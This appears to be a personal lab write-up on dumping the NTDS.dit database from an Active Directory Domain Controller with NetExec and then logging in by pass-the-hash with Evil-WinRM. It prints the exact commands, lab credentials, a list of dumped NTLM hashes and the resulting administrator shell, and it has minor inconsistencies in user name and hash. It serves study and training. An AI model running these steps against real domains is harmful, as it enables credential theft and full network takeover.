# ntds dumping

**Date:** June 2026  
**Author:** ShahinSecLab  
**Category:**Credential Capture  
**Difficulty:** Easy  
**Tools:** NetExec, Evil-winrm

## Table of Contents

- [Overview](#ntds-dumping)
- [What I Understood During the Process](#what-i-understood-during-the-process)
- [Why This Step Was Important in the Lab](#why-this-step-was-important-in-the-lab)
- [Step 1 — Token Impersonation & Privilege Escalation](#step---1)
- [Step 2 — NTDS Dump with NetExec](#step---2-ntds-dump--netexec)
- [Step 3 — Getting a Shell with Evil-WinRM](#step---3-getting-a-shell-with-evil-winrm)
- [What I Achieved](#what-i-achieved)


## NTDS Dumping 

From an attacker perspective during this Active Directory lab, NTDS dumping was one of the most important and high-impact stages of the entire attack chain.

After gaining access to a system with elevated privileges on the Domain Controller, I focused on extracting the Active Directory database file (NTDS.dit). This file is critical because it contains the core authentication data of the entire domain.

Instead of targeting a single user or machine, I shifted focus toward the full domain credential database.

## What I Understood During the Process

While working on this technique, I realized that:

- NTDS.dit is the main database of Active Directory
- It stores all user accounts in the domain
- It contains password hashes (not plain passwords)
- These hashes can represent both normal users and privileged accounts

This made it clear that compromising this file is equivalent to gaining deep visibility into the entire domain environment.

## Why This Step Was Important in the Lab

In the attack flow, NTDS dumping represented the final and most powerful stage of credential access. Earlier steps helped to move deeper into the system, but this step provided:

- A complete list of domain user credentials (in hash form)
- Potential access to high-privilege accounts
- A way to extend control across the network

# Steps

## Step - 1

During the Token Impersonation phase, a user named **"text"** was added to the **Domain Admin group**. After obtaining elevated privileges, I gained control over this account and elevated it to a high-privileged domain user.

In the next stage, I used the credentials of the same user to proceed with the NTDS dumping process as part of post-exploitation activity within the Active Directory environment.

### Credentials:

- user name: `test`
- password: `@shahin123#!`

## Step - 2 NTDS Dump — NetExec

```bash
nxc smb 192.168.5.134 -u test -p '@shahin123#!' --ntds
```

## Command Breakdown

```
|         Part        |                        Description                                                              |
|---------------------|-------------------------------------------------------------------------------------------------|
| `nxc`               | NetExec — a network penetration testing tool (successor to CrackMapExec)                        |
| `smb`               | Protocol being used — Server Message Block (SMB)                                                |
| `192.168.5.134`     | IP address of the target Domain Controller                                                      |
| `-u test`           | Username used for authentication                                                                |
| `-p '@shahin123#!'` | Password for the specified user                                                                 |
| `--ntds`            | Attempts to extract the NTDS.dit database, which contains Active Directory user password hashes |
```

When I ran the command, it connected to the Domain Controller over SMB and pulled the NTDS.dit database. This database holds the NTLM hashes of every single user in the domain — including Domain Admins.
Once I had those hashes I could:

- Pass the Hash — log in directly without even cracking the password
- Crack them offline with Hashcat to get the plaintext passwords
- Dump plaintext passwords if reversible encryption was enabled on any account

**Output:**

```
SMB         192.168.5.134   445    REDTEAMBD-DC     [*] Windows Server 2022 Build 20348 x64 (name:REDTEAMBD-DC) (domain:READTEAMBD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.5.134   445    REDTEAMBD-DC     [+] READTEAMBD.local\test:@shahin123#! (Pwn3d!)
SMB         192.168.5.134   445    REDTEAMBD-DC     [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.5.134   445    REDTEAMBD-DC     Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
SMB         192.168.5.134   445    REDTEAMBD-DC     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.134   445    REDTEAMBD-DC     krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5f8156b8f557baae7cd069ac724e1959:::
SMB         192.168.5.134   445    REDTEAMBD-DC     READTEAMBD.local\shahin:1105:aad3b435b51404eeaad3b435b51404ee:bcb3cd5313f9537196a11fdb9fad2ac9:::
SMB         192.168.5.134   445    REDTEAMBD-DC     READTEAMBD.local\sqlservice:1106:aad3b435b51404eeaad3b435b51404ee:7e449687caaf71367ad41ad9490f926d:::
SMB         192.168.5.134   445    REDTEAMBD-DC     READTEAMBD.local\rahimkhan:1109:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.5.134   445    REDTEAMBD-DC     READTEAMBD.local\karimkhan:1110:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.5.134   445    REDTEAMBD-DC     test2:1115:aad3b435b51404eeaad3b435b51404ee:26f6b62914c0b90561b76abc3121382d:::
SMB         192.168.5.134   445    REDTEAMBD-DC     test:1117:aad3b435b51404eeaad3b435b51404ee:26f6b62914c0b90561b76abc3121382d:::
SMB         192.168.5.134   445    REDTEAMBD-DC     REDTEAMBD-DC$:1000:aad3b435b51404eeaad3b435b51404ee:5d61398d1bb36494251624d87522d005:::
SMB         192.168.5.134   445    REDTEAMBD-DC     VICTIM-1$:1111:aad3b435b51404eeaad3b435b51404ee:af96b7d9f1e7c7d5a983c634b7db3a92:::
SMB         192.168.5.134   445    REDTEAMBD-DC     VICTIM-2$:1112:aad3b435b51404eeaad3b435b51404ee:4286814f1a9fcc086127d115a63621c7:::
SMB         192.168.5.134   445    REDTEAMBD-DC     [+] Dumped 12 NTDS hashes to /root/.nxc/logs/ntds/REDTEAMBD-DC_192.168.5.134_2026-06-06_011030.ntds of which 9 were added to the database
SMB         192.168.5.134   445    REDTEAMBD-DC     [*] To extract only enabled accounts from the output file, run the following command: 
SMB         192.168.5.134   445    REDTEAMBD-DC     [*] grep -iv disabled /root/.nxc/logs/ntds/REDTEAMBD-DC_192.168.5.134_2026-06-06_011030.ntds | cut -d ':' -f1
```
<p align="center">
  <img src="/writeups/ntds dump/images/step2.png" width="600">
</p>

# Step - 3 Getting a Shell with Evil-WinRM

After dumping the NTDS.dit and getting the Administrator hash, I used
Evil-WinRM to log into the Domain Controller directly using the hash —
no password needed.

```bash
evil-winrm -i 192.168.5.134 -u 'administrator' -H 'fc525c9683e8fe067095ba2ddc971889'
```

## Command Breakdown

- `evil-winrm` - A tool used to remotely access Windows machines via the WinRM (Windows Remote Management) protocol.
- `-i 192.168.5.134`- IP address of the target machine.
- `-u administrator`- Username used for authentication.
- `-H 'jlkahflahfklasklfashl'`- Last portion of administrator NTLM hash.

This is a Pass the Hash attack. Instead of using the actual password, I used the NTLM hash I dumped earlier from NTDS.dit to log straight into the Domain Controller as Administrator — no cracking needed.
Once the command runs successfully, I get a full interactive shell on the Domain Controller.

**Output:**

```text
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
readteambd\administrator
```
### Result

```
|      Field        |                 Value                          |
|-------------------|------------------------------------------------|
| **Target IP**     | `192.168.5.134`                                |
| **User**          | `administrator`                                |
| **Hash Used**     | `fc525c9683e8fe067095ba2ddc971889`             |
| **Shell**         | Got a full PowerShell session as Administrator |
| **Whoami Output** | `readteambd\administrator`                     |
```
I successfully logged in as **Domain Administrator** without ever knowing the real password — just the hash was enough to own the box.

<p align="center">
  <img src="/writeups/ntds dump/images/step3.png" width="600">
</p>


## What I Achieved

By reaching this stage, I demonstrated that:

- I had control over a Domain Controller-level environment
- I could extract sensitive authentication data from Active Directory
- I could use this data for further analysis and lateral movement in a real scenario